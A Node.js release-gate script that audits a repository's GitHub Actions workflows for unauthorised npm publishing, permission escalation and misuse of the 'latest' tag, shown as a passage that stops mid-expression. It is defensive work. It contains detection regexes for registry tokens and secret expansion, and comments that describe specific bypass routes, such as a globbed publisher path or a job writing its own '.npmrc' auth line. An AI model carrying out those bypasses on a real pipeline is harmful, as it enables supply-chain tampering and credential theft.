#!/usr/bin/env node
/**
 * The release path, exercised on a pull request (#80, FR-003, FR-004).
 *
 * WHY THIS EXISTS. `.github/workflows/release.yml` triggers on `push: tags: ['v*.*.*']` and
 * nothing else, so no pull request has ever run it. That is not a hypothetical gap — the
 * `cp packages/html-js/src/nav-pill/sk-nav-pill.js` step #73 deleted would have hard-failed the
 * next release, and it was found by a lens READING the file. Three hand-written package lists
 * drifted apart in the same file for the same reason. This script is the thing that runs.
 *
 * IT ASSERTS TARBALLS, NEVER EXIT CODES, and that is the whole design. Measured:
 *
 *     $ cd packages/elements && npm publish --dry-run; echo $?
 *     npm warn publish Skipping workspace @spec-kitty/elements, marked as private
 *     0
 *
 * So #80's revised exit criterion — "npm publish --dry-run passes for every package in the new
 * graph" — was ALREADY satisfied, by two packages that published nothing. A gate reading exit
 * codes here is green over an empty set. Every check below reads packed contents instead.
 *
 * THE CHECKS ARE PURE FUNCTIONS over a {packages, tarballs} model, so `--selftest` can feed them
 * synthetic failures. A gate observed green on a healthy tree has demonstrated nothing about what
 * it can see; the probes are the evidence, the way build-react-wrappers.mjs --selftest is.
 */
import { execFileSync } from 'node:child_process';
import { readFileSync, readdirSync, existsSync, mkdtempSync, mkdirSync, writeFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, dirname, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import { parse } from 'yaml';
import { publishable, buildable, all } from './release-graph.mjs';
import { PACK_DIR_NAME } from './pack-derived-set.mjs';

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..');
const WORKFLOW = '.github/workflows/release.yml';
const REUSABLE_WORKFLOW = '.github/workflows/publish-packages.yml';
// The job names, so AUDITED_PUBLISH_JOBS is the SAME pair main() audits rather than a second list
// that could quietly gain an entry (REL3 pass 6, architect).
const RELEASE_JOB = 'release';
const PAYLOAD_JOB = 'publish';

/**
 * A thin caller has NO publish step of its own — the payload is in the reusable workflow — so a
 * checker keyed on job steps would pass it while auditing nothing. That is the blind spot the
 * reshape exists to close, and it must not be rebuilt one level up.
 *
 * So: any workflow that delegates to the reusable publish workflow must pass a NON-EMPTY
 * `dist-tag`. Omitting `--tag` is the one irreversible mistake available here — npm then writes
 * `latest`, and the first publish of a package with no existing versions claims the prod channel.
 *
 * PURE over `{file, text}` pairs so the probe table can drive it.
 */
export const GH_PACKAGES = 'https://npm.pkg.github.com';

/**
 * The permission scopes the payload's job declares. A called workflow declaring ABOVE what its
 * caller grants fails workflow VALIDATION — the run never starts — so this is a ceiling check, not
 * a preference. Exported for the probe table.
 */
export const PAYLOAD_PERMISSIONS = {
  contents: 'read',
  packages: 'write',
  // REL3 (#364): `actions/attest-build-provenance` signs through Sigstore with the job's OIDC token and
  // stores the attestation on this repo. Justified here, so every caller must grant both (ceiling).
  'id-token': 'write',
  attestations: 'write',
};
const PERMISSION_RANK = { none: 0, read: 1, write: 2 };

/**
 * Read the payload's OWN declared permissions, rather than trusting a constant to mirror them.
 *
 * ALL FOUR REVIEW LENSES CONVERGED ON THIS INDEPENDENTLY. The first version of the ceiling check
 * compared each caller's grant against the hard-coded `PAYLOAD_PERMISSIONS` above and never opened
 * `publish-packages.yml`. So the relation was instrumented in one direction only — and the
 * direction that actually broke was the unchecked one:
 *
 *   caller lowered to `packages: read`  -> RED   (caught)
 *   payload raised to `contents: write` -> GREEN (the pass-2 BLOCKER, restorable, gate silent)
 *
 * Measured: reverting the payload to `contents: write` produced byte-identical output from the
 * full check and 51/51 green from the selftest. That is the co-edited-baseline defect this repo
 * has a standing rule about — the constant and the payload agreed by hand, and `release-rc.yml`'s
 * comment claiming "a checker asserts it" was not true of the payload side.
 *
 * Now the constant is the CEILING the payload may not exceed, and the parsed value is what callers
 * are held against. Both directions are live.
 */
export function payloadDeclaredPermissions(payloadText) {
  let wf;
  try {
    wf = parse(payloadText);
  } catch {
    return { problems: ['the reusable publish workflow does not parse; cannot read its permissions'], declared: null };
  }
  const declared = wf?.jobs?.publish?.permissions;
  if (typeof declared === 'string') {
    // `write-all` / `read-all` are real forms. `write-all` on the payload is a blanket escalation
    // and must not pass silently just because it is not an object.
    return {
      problems: [
        `the publish payload declares \`permissions: ${declared}\` — a blanket grant. Declare the ` +
          'explicit minimum instead, so the ceiling check has something to compare.',
      ],
      declared: null,
    };
  }
  if (typeof declared !== 'object' || declared === null) {
    return {
      problems: ['the publish payload declares no `permissions:` block, so it inherits more than it needs'],
      declared: null,
    };
  }
  const problems = [];
  for (const [scope, level] of Object.entries(declared)) {
    const allowed = PAYLOAD_PERMISSIONS[scope];
    if (allowed === undefined) {
      problems.push(
        `the publish payload declares \`${scope}: ${level}\`, which is not in its recorded minimum ` +
          `(${Object.keys(PAYLOAD_PERMISSIONS).join(', ')}). Every scope a caller must grant has to ` +
          'be justified here first.',
      );
      continue;
    }
    if ((PERMISSION_RANK[level] ?? 99) > PERMISSION_RANK[allowed]) {
      problems.push(
        `the publish payload declares \`${scope}: ${level}\` but its recorded minimum is ` +
          `\`${scope}: ${allowed}\`. A called workflow declaring above what a caller grants fails ` +
          'workflow validation and the run never starts — this is exactly the defect that made the ' +
          'rc stream unstartable.',
      );
    }
  }
  return { problems, declared };
}


/** Workflows allowed to run `npm publish` without delegating. EXACT paths: a suffix test exempted
 *  `nightly-release.yml` as well, because it ends with `release.yml`. `release.yml` is the
 *  sanctioned holdout: it owns `latest`, which the payload refuses unconditionally, so it publishes
 *  through its own scripts/publish-latest.mjs (REL3, #364) rather than the payload. */
// EMPTY SINCE REL3 pass 5. It exempted the payload and release.yml from the inline-`npm publish`
// test because both once published inline. Neither does: the payload runs publish-derived-set.mjs
// and prod runs publish-latest.mjs, both exact steps. Keeping the exemption meant a SECOND job in
// either file could `npm publish` and exfiltrate, byte-identical gate output (architect, M-A/M-B).
// Left as an empty set, not deleted, so re-adding a file here is a visible edit.
const INLINE_PUBLISH_EXEMPT = new Set([]);

/**
 * The publishing predicates, in one place. They were spelled out at three call sites each (REL3 pass 6,
 * reducer): the five script names, the `npm publish|dist-tag` regex and the attest `uses` test. A sixth
 * registry script would have had to be added three times — the drifting-lists defect this mission began
 * with, one level up.
 */
const REGISTRY_SCRIPTS = ['bump-prerelease', 'publish-derived-set', 'publish-latest', 'verify-published-integrity', 'report-dist-tags'];
const RUNS_REGISTRY_SCRIPT = new RegExp(`scripts/(${REGISTRY_SCRIPTS.join('|')})\\.mjs(?!\\s*--selftest)`);
// FLAGS MAY PRECEDE THE SUBCOMMAND (REL3 pass 6, architect, measured on this npm):
// `npm --loglevel=error publish --tag latest` publishes, and read green everywhere. So does an
// interpreter named by path: `/usr/bin/node …`, `$(which node) …`. Both are absorbed here rather than
// at each call site — there were six spellings of the npm test alone.
// `--flag`, `--flag=value` AND `--flag value` (REL3 pass 8, debugger): `npm --workspace packages/tokens
// publish` read green because only the first two forms were tolerated.
const NPM_FLAGS = '(?:-{1,2}[\\w-]+(?:=\\S+)?\\s+(?:[^-\\s]\\S*\\s+)?)*';
const RUNS_NPM_PUBLISH = new RegExp(`(^|[\\s;&|($\`])npm\\s+${NPM_FLAGS}(publish|dist-tag)\\b`);
/** `npm publish` in particular (not dist-tag), flags and all. */
const RUNS_INLINE_PUBLISH = new RegExp(`(^|[\\s;&|($\`])npm\\s+${NPM_FLAGS}publish\\b`);
/** `npm dist-tag add`, flags and all — it kept a flagless regex of its own when it was hoisted, so
 *  `npm --loglevel=error dist-tag add` was refused in an unaudited job and allowed in the two audited
 *  ones, for the command that repoints `latest` directly (REL3 pass 9, architect). */
const RUNS_DIST_TAG_ADD = new RegExp(`(^|[\\s;&|($\`])npm\\s+${NPM_FLAGS}dist-tag\\s+${NPM_FLAGS}add\\b`);

/**
 * May this `env:` entry, inside one of the two audited publishing jobs, carry what it carries?
 * Returns null when it may, or the reason it may not. Both exemptions are here, with the condition
 * that earns them, because keeping them apart from the rule is what produced the pass-10 defect.
 */
function forbiddenEnvCredential({ key, value, step }) {
  if (typeof value !== 'string' || !EXPANDS_A_SECRET.test(value)) return null;
  // NODE_AUTH_TOKEN is bounded elsewhere, by TOKEN_SCRIPT_RUN: only an exact registry-script step.
  if (key === 'NODE_AUTH_TOKEN') return null;
  // GH_TOKEN is what `gh attestation verify` reads, and the verify step is the only step in either
  // workflow that carries it. Exempt by exact key, exact value AND exact run — not by key alone.
  if (key === 'GH_TOKEN' && value.trim() === '${{ github.token }}' && String(step?.run ?? '').trim() === 'node scripts/verify-published-integrity.mjs') return null;
  return 'inside a publishing job any secret, `toJSON(secrets)` or `${{ github.token }}` is the registry credential under another name; only `NODE_AUTH_TOKEN` on a registry-script step, and `GH_TOKEN: ${{ github.token }}` on the verify step, may carry one';
}

/** Inline `npm publish`, or one of the publish scripts, which runs it. Hoisted: it was rebuilt inside a
 *  per-step callback (REL3 pass 7, reducer). */
const PUBLISHES_SOMEHOW = new RegExp(`${RUNS_INLINE_PUBLISH.source}|publish-(latest|derived-set)\\.mjs(?!\\s*--selftest)`);
// A CREDENTIAL IN THE RUN TEXT, not only in an `env:` block (REL3 pass 6, debugger: R01 and R02 are
// the same file except that one writes the token through the run). Every indirection — a Makefile, a
// shell script, a workspace npm script — must still bring the credential into the workflow file,
// because only the workflow can expand `${{ secrets.* }}`. The literal word `secrets.` is NOT the
// test: ci-quality's promote-develop job prints an error message containing it.
const WRITES_REGISTRY_CREDENTIAL = /_authToken|_auth\b|NODE_AUTH_TOKEN/;
// A secret expanded in run text is a WEAKER signal and gets its own message (REL3 pass 7, reducer):
// it also matches an honest surge or codecov upload written inline. The remedy for those is this
// repository's own idiom — pass it through `env:`, as pr-preview.yml does — not to widen the audited
// list. Kept because it is the arm that closes the indirection class: a Makefile or a shell wrapper
// still needs the workflow to expand the secret.
// `${{ github.token }}` IS THE SAME CREDENTIAL (REL3 pass 9, debugger, with a runtime proof: npm
// expands `${T}` inside `.npmrc`, so a step holding it under any name authenticates as the
// GITHUB_TOKEN the job legitimately has). `toJSON(secrets)` hands over all of them at once, and the
// expression language is case-insensitive.
const EXPANDS_A_SECRET = /\$\{\{\s*(?:secrets\.|toJSON\(\s*secrets\b|github\.token\b)/i;
const SIGNS_ATTESTATION = (steps) => steps.some((st) => typeof st?.uses === 'string' && /attest-build-provenance/.test(st.uses));

/** A `node` argument this gate can read: a literal path under scripts/, no expansion of any kind. */
// Nested paths are literal too: this mission created `scripts/lib/direct-invocation.mjs`, and the
// first form of this rule refused it while telling the author to "write the plain path" (REL3 pass 6,
// debugger).
const LITERAL_SCRIPT_PATH = /^\.?\/?scripts\/[\w.-]+(?:\/[\w.-]+)*$/;

/**
 * Every `scripts/…` token of every `node` invocation in `text` that this gate cannot read literally.
 *
 * EVERY TOKEN, not the first one (REL3 pass 6, reviewer). Reading one token after `node` meant an
 * interpreter flag hid the path: `node --no-warnings scripts/publish-lat*.mjs` was checked as
 * `--no-warnings`, so the globbed path went unexamined by this rule and unnamed by every rule that
 * matches a script's name. Reviewer's chain: a branch job writing its own `.npmrc` auth line and
 * running `node --no-warnings scripts/publish-derived*.mjs` with `DIST_TAG: rc` published real rc
 * versions, unattested, holding no NODE_AUTH_TOKEN and naming no publisher. Every probe written
 * before this put the path first, which is why it read green.
 */
export function nonLiteralScriptTokens(text) {
  // ONLY WHEN THE TOKEN COULD RESOLVE TO A REGISTRY SCRIPT (REL3 pass 7, reducer). Scanning every
  // `scripts/…` token whatever runs it was the right move — three passes each closed one more way to
  // spell the interpreter, which is a rule that cannot converge — but "non-literal" alone refused
  // `ls scripts/`, `cp scripts/*.md docs/` and `eslint scripts/*.mjs`, none of which can execute a
  // publisher. So the glob or interpolation is expanded to the widest thing it could match and tested
  // against the five registry scripts: `scripts/publish-lat*.mjs` and `scripts/*.mjs` match,
  // `scripts/*.md` and a bare directory do not.
  const bad = [];
  const withoutComments = String(text ?? '').replace(/(^|\n)\s*#[^\n]*/g, '$1');
  const targets = REGISTRY_SCRIPTS.map((n) => `scripts/${n}.mjs`);
  // COLLAPSE SUBSTITUTIONS BEFORE TOKENISING (REL3 pass 8, reducer): `$(echo publish-latest).mjs`
  // contains a space, so splitting on whitespace and parens tore it into pieces that each looked
  // harmless. A substitution is one opaque "anything" — make it one token first.
  const collapsed = withoutComments.replace(/\$\([^)]*\)/g, '$(S)').replace(/`[^`]*`/g, '$(S)');
  for (const token of collapsed.split(/[\s;|&]+/).filter(Boolean)) {
    const cleaned = token.replace(/^["'`]+|["'`]+$/g, '');
    if (!cleaned.includes('scripts/') || LITERAL_SCRIPT_PATH.test(cleaned)) continue;
    // The shell CONCATENATES quoted pieces, so `scripts/publish-lat"est".mjs` is the publisher spelled
    // to look like something else; widen the dequoted form, not the written one.
    const dequoted = cleaned.replace(/["'`]/g, '');
    // `*`, `?`, `${…}`, `$VAR` and `$(…)` all stand for "anything the shell puts here". Widen FIRST,
    // to placeholders, then escape what is left, then put the wildcards back — escaping first turned
    // `${E}` into something the widening pattern no longer matched.
    const WIDE = '\u0000';
    const ONE = '\u0001';
    // `[pr]ublish`, `mj[s]` and `{mjs,js}` are shell expansions too, and all three expand to the real
    // publisher here (REL3 pass 8, reviewer — a bracket expression has cost this repository a mission
    // before). A character class stands for one character; a brace list for anything it contains.
    const widened = dequoted
      .replace(/^\.\//, '')
      .replace(/\$\{[^}]*\}|\$\([^)]*\)|\$[A-Za-z_]\w*|\*/g, WIDE)
      .replace(/\{[^}]*\}/g, WIDE)
      .replace(/\[[^\]]*\]/g, ONE)
      .replace(/\?/g, ONE)
      .replace(/[.+^${}()|[\]\\]/g, '\\$&')
      .split(WIDE)
      .join('.*')
      .split(ONE)
      .join('.');
    let re;
    try {
      re = new RegExp(`^${widened}$`);
    } catch {
      bad.push(cleaned); // an expression this gate cannot even compile is one it cannot read
      continue;
    }
    if (targets.some((t) => re.test(t))) bad.push(cleaned);
  }
  return bad;
}

/** Only THIS repo's payload counts as delegation. `uses.includes(...)` accepted a third-party
 *  `some-org/evil/.github/workflows/publish-packages.yml@main`, which satisfied the floor while
 *  publishing through code nobody here reviews. */
function isOwnPayload(uses) {
  return /^\.\/\.github\/workflows\/publish-packages\.yml$/.test(uses.trim());
}

/** Tag-triggered, read from the PARSED trigger rather than by looking for `tags:` anywhere in the
 *  file — a comment containing that substring was enough to license `dist-tag: latest`. */
function isTagTriggered(wf) {
  const on = wf?.on ?? wf?.true; // YAML 1.1 parses a bare `on:` key as the boolean true
  if (!on || typeof on !== 'object') return false;
  if (on.release) return true;
  const push = on.push;
  return Boolean(push && typeof push === 'object' && push.tags);
}

/**
 * REL3 pass 3: release.yml's TRIGGER is part of the fence around `latest`, and nothing held it.
 * `publish-latest.mjs` refuses a non-tag run at runtime, but a `workflow_dispatch` on a tag ref, a
 * `branches:` filter or a looser tag glob would all have read green here. So the trigger is pinned
 * exactly: `push` with `tags: ['v*.*.*']`, and no other event, filter or key.
 */
export const RELEASE_TRIGGER_TAGS = ['v*.*.*'];
export function checkReleaseTrigger(text, label = WORKFLOW) {
  let wf;
  try {
    wf = parse(text);
  } catch (e) {
    return [`${label} does not parse: ${e.message}`];
  }
  const on = wf?.on ?? wf?.true;
  const want = `on: { push: { tags: ${JSON.stringify(RELEASE_TRIGGER_TAGS)} } }`;
  if (!on || typeof on !== 'object' || Array.isArray(on)) return [`${label}'s trigger must be exactly ${want} — found ${JSON.stringify(on)}`];
  const problems = [];
  const events = Object.keys(on);
  if (events.length !== 1 || events[0] !== 'push') problems.push(`${label} must trigger on \`push\` only — found ${events.join(', ')}; any other event can start the job that publishes \`latest\``);
  const push = on.push;
  if (!push || typeof push !== 'object') {
    problems.push(`${label}'s push trigger must be ${want}`);
    return problems;
  }
  const keys = Object.keys(push);
  if (keys.length !== 1 || keys[0] !== 'tags') problems.push(`${label}'s push trigger must filter on \`tags\` and nothing else — found ${keys.join(', ')}`);
  if (JSON.stringify(push.tags) !== JSON.stringify(RELEASE_TRIGGER_TAGS)) problems.push(`${label}'s tag filter must be exactly ${JSON.stringify(RELEASE_TRIGGER_TAGS)} — found ${JSON.stringify(push.tags)}`);
  return problems;
}

/**
 * No npm script may reach a publisher. `npm run <name>` is a run-text form the workflow rules cannot
 * follow (REL3 pass 4, reducer), so the indirection is closed at the other end: the root manifest's
 * scripts may not name the publishing scripts at all. Every real invocation is an exact `node …` step.
 */
export function checkNoIndirectPublishScripts(rootPkg, label = 'package.json') {
  // Called per manifest — the root one AND every workspace (REL3 pass 6, debugger: `npm run -w` put
  // the body in a workspace manifest, which nothing read).
  const problems = [];
  for (const [name, body] of Object.entries(rootPkg?.scripts ?? {})) {
    if (typeof body !== 'string') continue;
    for (const script of ['publish-latest.mjs', 'publish-derived-set.mjs']) {
      if (body.includes(script)) {
        problems.push(`${label} script \`${name}\` runs ${script} — \`npm run ${name}\` would reach a publisher from any job, past every rule that names the script`);
      }
    }
    // AND THE SAME LITERAL-PATH RULE AS A WORKFLOW STEP (REL3 pass 5, debugger): the name test above
    // is a substring test, so `node scripts/publish-lat*.mjs` in an npm script named neither.
    for (const arg of nonLiteralScriptTokens(body)) {
      problems.push(`${label} script \`${name}\` names \`${arg}\`, a path that could expand to one of the release scripts — a path that is not literal is outside every rule that names a script`);
    }
  }
  return problems;
}

/**
 * Composite actions are steps written somewhere else (REL3 pass 5, debugger and architect). Nothing
 * read them, so `uses: ./.github/actions/promote` whose `action.yml` ran the publisher defeated the
 * whole fence at once. No composite action in this repository publishes anything, so the rule is
 * absolute rather than conditional: no registry script, no `npm publish`/`dist-tag`, no attestation
 * signing, no registry token, and no non-literal `node scripts/…` path.
 */
/**
 * Every local action a workflow actually USES, as `{ ref, file, text }`. Globbing
 * one directory of `action.yml` files read a directory, not the graph: `uses: ./tools/promote` and
 * `uses: ./.github/actions/ops/promote` (one level deeper) were both invisible (REL3 pass 6,
 * architect). A reference that cannot be resolved is a refusal, not a skip.
 */
export function collectUsedLocalActions(workflows, readAction) {
  const refs = new Map();
  const problems = [];
  for (const { file, text } of workflows ?? []) {
    let wf;
    try {
      wf = parse(text);
    } catch {
      continue;
    }
    for (const [jobName, job] of Object.entries(wf?.jobs ?? {})) {
      const uses = [typeof job?.uses === 'string' ? job.uses : null, ...(Array.isArray(job?.steps) ? job.steps.map((st) => (typeof st?.uses === 'string' ? st.uses : null)) : [])];
      for (const u of uses) {
        if (!u || !u.trim().startsWith('./')) continue;
        const ref = u.trim();
        if (/\.ya?ml$/.test(ref)) continue; // a reusable WORKFLOW, checked as a workflow
        const found = readAction(ref);
        if (!found) {
          problems.push(`${file} job \`${jobName}\` uses the local action \`${ref}\`, which has no readable action.yml — an action this gate cannot read is an action it cannot hold to anything`);
          continue;
        }
        refs.set(found.file, found);
      }
    }
  }
  return { actions: [...refs.values()], problems };
}

export function checkCompositeActionsDoNotPublish(actions, { dirExists = false } = {}) {
  const problems = [];
  // A GREEN LINE OVER ZERO INPUTS is the founding defect of this gate family (REL3 pass 6, reducer):
  // a renamed `.github/actions` would leave this scanning nothing and saying so cheerfully. There is
  // no composite action in this repository today, so an EMPTY list is only refused when the directory
  // is actually there.
  if (dirExists && (!Array.isArray(actions) || actions.length === 0)) {
    return ['.github/actions exists but no action.yml was read from it — refusing to certify composite actions over nothing'];
  }
  for (const { file, text } of actions ?? []) {
    let doc;
    try {
      doc = parse(text);
    } catch {
      continue;
    }
    const steps = Array.isArray(doc?.runs?.steps) ? doc.runs.steps : [];
    const runs = steps.map((st) => (typeof st?.run === 'string' ? st.run : '')).join('\n');
    const why = [];
    if (RUNS_REGISTRY_SCRIPT.test(runs)) why.push('runs a registry script');
    if (RUNS_NPM_PUBLISH.test(runs)) why.push('runs `npm publish`/`npm dist-tag`');
    if (WRITES_REGISTRY_CREDENTIAL.test(runs)) why.push('writes the registry credential into its run');
    if (EXPANDS_A_SECRET.test(runs)) why.push('expands a `${{ secrets.… }}` in its run');
    if (SIGNS_ATTESTATION(steps)) why.push('signs attestations');
    if (steps.some((st) => st?.env && typeof st.env === 'object' && 'NODE_AUTH_TOKEN' in st.env)) why.push('holds NODE_AUTH_TOKEN in a step');
    if (doc?.runs?.env && typeof doc.runs.env === 'object' && 'NODE_AUTH_TOKEN' in doc.runs.env) why.push('holds NODE_AUTH_TOKEN for the whole action');
    for (const arg of nonLiteralScriptTokens(runs)) why.push(`names \`${arg}\`, a path that could expand to one of the release scripts`);
    if (why.length) {
      problems.push(`${file} ${why.join(' and ')} — a composite action's steps are outside every rule this gate applies to the publishing jobs, so none may publish`);
    }
  }
  return problems;
}

/** The (file, job) pairs every REL3 rule is applied to. Anything else that can publish is refused. */
export const AUDITED_PUBLISH_JOBS = [
  [WORKFLOW, RELEASE_JOB],
  [REUSABLE_WORKFLOW, PAYLOAD_JOB],
];

/**
 * NOTHING MAY PUBLISH FROM AN UNAUDITED JOB (REL3 pass 5, architect). Every other rule in this file
 * is applied to two hard-coded (file, job) pairs, while the privilege is granted per workflow: a
 * second job in release.yml inherited `id-token`/`packages: write` and could publish and exfiltrate
 * with the gate's output unchanged, and a third publishing workflow was invisible altogether. So the
 * set of publishing-capable jobs is DISCOVERED and held to the audited list, rather than assumed.
 *
 * A job is publishing-capable if it holds NODE_AUTH_TOKEN, runs `npm publish`/`npm dist-tag`, runs one
 * of the registry scripts, or uses the attestation action. `--selftest` runs are exempt: they publish
 * nothing, and ci-quality runs every probe table on each PR.
 */
export function checkNoUnauditedPublishingJobs(workflows, audited = AUDITED_PUBLISH_JOBS) {
  const problems = [];
  if (!Array.isArray(workflows) || workflows.length === 0) {
    return ['no workflow files found — refusing to certify the publishing-job set over nothing'];
  }
  const isAudited = (file, job) => audited.some(([f, j]) => f === file && j === job);
  for (const { file, text } of workflows) {
    let wf;
    try {
      wf = parse(text);
    } catch {
      continue; // other checks own malformed YAML
    }
    for (const [jobName, job] of Object.entries(wf?.jobs ?? {})) {
      if (isAudited(file, jobName)) continue;
      // A job that only delegates to our own payload is the rc caller: it grants the ceiling and runs
      // no steps of its own, and the payload's own pair is audited.
      if (typeof job?.uses === 'string' && isOwnPayload(job.uses)) continue;
      const steps = Array.isArray(job?.steps) ? job.steps : [];
      // COMMENTS STRIPPED (REL3 pass 6, reviewer): raw run text meant an unrelated job whose comment
      // mentioned `npm dist-tag ls` was refused. The rest of this file reads shell the same way.
      const runs = steps.map((st) => (typeof st?.run === 'string' ? st.run.replace(/(^|\n)\s*#[^\n]*/g, '$1') : '')).join('\n');
      const why = [];
      // THE PRIVILEGE ITSELF IS A SIGNAL (REL3 pass 6, reviewer): a job can publish through a
      // third-party action, which no text rule here reads. `packages: write` and `attestations: write`
      // are held by nothing in this repository but the publishing path — unlike `id-token: write`,
      // which Pages deployment also needs, so that one cannot serve as a signal.
      const perms = job?.permissions ?? wf?.permissions;
      if (perms && typeof perms === 'object') {
        for (const scope of ['packages', 'attestations']) {
          if (perms[scope] === 'write') why.push(`declares \`${scope}: write\``);
        }
      } else if (perms === 'write-all') {
        why.push('declares `permissions: write-all`');
      }
      const holdsToken = (e) => e && typeof e === 'object' && 'NODE_AUTH_TOKEN' in e;
      if (holdsToken(wf?.env) || holdsToken(job?.env) || steps.some((st) => holdsToken(st?.env))) why.push('holds NODE_AUTH_TOKEN');
      if (RUNS_NPM_PUBLISH.test(runs)) why.push('runs `npm publish`/`npm dist-tag`');
      if (RUNS_REGISTRY_SCRIPT.test(runs)) why.push('runs a registry script');
      if (SIGNS_ATTESTATION(steps)) why.push('signs attestations');
      // A SECRET PASSED INTO A LOCAL ACTION (REL3 pass 7, reducer): the action's own steps are read by
      // checkCompositeActionsDoNotPublish, but a job can hand it the credential through `with:` and show
      // no signal of its own. Restricted to LOCAL actions on purpose — `ci-quality.yml`'s promote-develop
      // legitimately passes the release App key to actions/create-github-app-token, and refusing every
      // `with:` secret would refuse honest work.
      for (const st of steps) {
        if (typeof st?.uses === 'string' && st.uses.trim().startsWith('./') && st.with && typeof st.with === 'object') {
          if (Object.values(st.with).some((v) => typeof v === 'string' && EXPANDS_A_SECRET.test(v))) {
            why.push(`hands a secret to the local action \`${st.uses.trim()}\` through \`with:\``);
          }
        }
      }
      // A CREDENTIAL UNDER ANOTHER NAME (REL3 pass 6, reducer): a step that writes its own `.npmrc`
      // auth line holds the registry credential without ever naming NODE_AUTH_TOKEN. `_authToken`
      // appears nowhere in this repository. It does not close the class — `secrets.GITHUB_TOKEN` is
      // legitimately used elsewhere, and a wrapper outside scripts/ can assemble the rest — and the
      // runbook records that residual: the durable fence there is a privilege boundary, not a regex.
      if (WRITES_REGISTRY_CREDENTIAL.test(runs)) why.push('writes the registry credential into its run');
      if (EXPANDS_A_SECRET.test(runs)) why.push('expands a `${{ secrets.… }}` in its run (if this is not a registry credential, pass it through `env:` — do not add the job to the audited list)');
      if (why.length) {
        problems.push(
          `${file} job \`${jobName}\` ${why.join(' and ')}, but it is not one of the audited publishing jobs ` +
            `(${audited.map(([f, j]) => `${f}:${j}`).join(', ')}) — every rule in this gate is applied to those, and to nothing else`,
        );
      }
    }
  }
  return problems;
}

export function checkPublishingCallersDelegate(workflows, payloadText = null) {
  const problems = [];
  // The ceiling the payload actually declares, not a constant hoping to match it.
  let ceiling = PAYLOAD_PERMISSIONS;
  if (typeof payloadText === 'string') {
    const { problems: payloadProblems, declared } = payloadDeclaredPermissions(payloadText);
    problems.push(...payloadProblems);
    if (declared) ceiling = declared;
  }
  if (!Array.isArray(workflows) || workflows.length === 0) {
    return ['no workflow files found — refusing to certify caller delegation over nothing'];
  }
  let delegatingJobs = 0;
  let inlinePublishers = [];
  for (const { file, text } of workflows) {
    let wf;
    try {
      wf = parse(text);
    } catch {
      continue; // not our concern here; other checks own malformed YAML
    }
    for (const [jobName, job] of Object.entries(wf?.jobs ?? {})) {
      const uses = typeof job?.uses === 'string' ? job.uses : null;
      if (!uses || !isOwnPayload(uses)) {
        // A workflow that publishes with its own inline steps instead of delegating is the exact
        // state the reshape undid. `release.yml` is the one sanctioned holdout, because it owns
        // `latest`; anything else re-inlining a payload is a regression that must not pass silently.
        const inline = Object.values(job?.steps ?? [])
          .map((s) => (typeof s?.run === 'string' ? s.run : ''))
          .join('\n');
        // Two exemptions, both deliberate. `publish-packages.yml` IS the payload — it is supposed
        // to publish inline, and flagging it would make the check reject the thing it protects.
        // `release.yml` is the sanctioned holdout: it owns `latest`, which the payload cannot publish.
        // EXACT paths. A suffix test exempted `nightly-release.yml` too, because
        // `'nightly-release.yml'.endsWith('release.yml')` is true — so any workflow whose name
        // happened to end that way could publish inline, unnoticed.
        const isPayloadOrProd = INLINE_PUBLISH_EXEMPT.has(file);
        if (RUNS_INLINE_PUBLISH.test(inline) && !isPayloadOrProd) {
          inlinePublishers.push(`${file} job \`${jobName}\``);
        }
        // publish-latest.mjs IS A PUBLISHER, AND ONLY PROD MAY RUN IT (REL3 review). It writes `latest`,
        // so a step running it anywhere but release.yml's tag-triggered `release` job — the rc payload
        // included — claims the prod channel, irreversibly. The `npm publish` text match above cannot
        // see it, which is how a branch-triggered job running it passed every gate.
        // …AND THE NAME MUST BE LITERAL (REL3 pass 4, reducer). The test above reads the run's
        // text, so `node scripts/publish-lat*.mjs` — which the shell expands to the same file —
        // matched nothing. Any `node scripts/…` argument carrying a glob or a quote is refused
        // outright, in every workflow and every job: no honest step needs one, and a path the
        // gate cannot read literally is a path it cannot confine.
        // AN ALLOWLIST, not a list of refused characters (REL3 pass 5, architect): a denylist caught
        // `*`, `?`, `[` and quotes but not `$NAME` or `${NAME}`, which the shell expands the same way.
        // A literal path is the only readable one. See nonLiteralScriptTokens for the flag case.
        for (const arg of nonLiteralScriptTokens(inline)) {
          problems.push(`${file} job \`${jobName}\` names \`${arg}\`, a path that could expand to one of the release scripts — every rule in this gate reads a script path literally, so a globbed, quoted, braced or interpolated one is outside all of them (write the plain path)`);
        }
        if (/publish-latest\.mjs(?!\s*--selftest)/.test(inline) && !(file === '.github/workflows/release.yml' && jobName === 'release')) {
          problems.push(
            `${file} job \`${jobName}\` runs scripts/publish-latest.mjs, which publishes \`latest\` — only ` +
              "release.yml's tag-triggered `release` job may run it",
          );
        }
        continue;
      }
      delegatingJobs += 1;
      const tag = job?.with?.['dist-tag'];
      if (typeof tag !== 'string' || tag.trim() === '') {
        problems.push(
          `${file} job \`${jobName}\` delegates to the reusable publish workflow without a ` +
            'non-empty `dist-tag`; npm would default to `latest` and claim the prod channel',
        );
      } else if (tag.trim() === 'latest' && !isTagTriggered(wf)) {
        // NON-EMPTY IS NOT ENOUGH. `dist-tag: latest` from a branch-triggered caller claims the
        // prod channel just as surely as omitting `--tag` — the value, not merely its presence, is
        // the irreversible thing. Only a tag-triggered workflow may legitimately write `latest`.
        problems.push(
          `${file} job \`${jobName}\` passes \`dist-tag: latest\` from a caller that is not ` +
            'tag-triggered; that claims the prod channel from a prerelease stream, irreversibly',
        );
      }
      const registry = job?.with?.registry;
      if (typeof registry !== 'string' || registry.trim() === '') {
        problems.push(`${file} job \`${jobName}\` delegates to the publish workflow without a \`registry\``);
      } else if (registry.trim().replace(/\/+$/, '') !== GH_PACKAGES) {
        // The operator's standing ruling is GitHub Packages only. Non-emptiness let the stream be
        // repointed at npmjs.org with every gate green.
        problems.push(
          `${file} job \`${jobName}\` publishes to \`${registry.trim()}\`; the standing ruling is ` +
            `GitHub Packages only (${GH_PACKAGES})`,
        );
      }
      // THE CEILING. The caller's grant must be >= every scope the payload declares, or the run
      // fails validation before any job starts. Job-level `permissions:` wins where present;
      // otherwise the workflow-level block applies.
      const granted = job?.permissions ?? wf?.permissions;
      for (const [scope, needed] of Object.entries(ceiling)) {
        // `permissions: write-all` is a real, more-than-sufficient grant; the object test alone
        // rejected it. `read-all` grants read on every scope and nothing more.
        const have =
          granted === 'write-all'
            ? 'write'
            : granted === 'read-all'
              ? 'read'
